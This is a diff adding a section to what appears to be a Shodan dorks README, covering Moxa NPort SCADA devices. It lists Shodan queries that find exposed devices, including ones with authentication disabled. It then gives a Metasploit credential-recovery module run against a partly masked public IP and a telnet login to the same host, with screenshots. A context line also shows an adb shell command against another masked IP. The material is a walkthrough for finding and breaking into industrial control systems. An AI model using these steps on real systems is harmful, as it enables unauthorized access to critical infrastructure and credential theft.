@@ -118,6 +118,31 @@ adb -s 59.x.x.112:5555 shell
 ```
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e2bf07c6-157a-4fac-b4e5-f317e6ced25f)
 
+## Access devices SCADA Moxa 
+
+```sh
+"Moxa Nport Device" Status: Authentication enabled port:"4800"
+"Moxa Nport Device" Status: Authentication disabled port:"4800"
+```
+
+```sh
+use auxiliary/admin/scada/moxa_credentials_recovery
+set FUNCTION CREDS
+set rport 4800
+set rhosts 212.x.x.14
+run
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/54060261-80cc-4893-b134-b3fe2e0bc62c)
+
+
+```sh
+telnet 212.x.x.14
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/805674eb-82d9-4028-a169-c3b577f9a136)
+
+
+
+
 ## OS Windows Obsolete
 
 ```sh
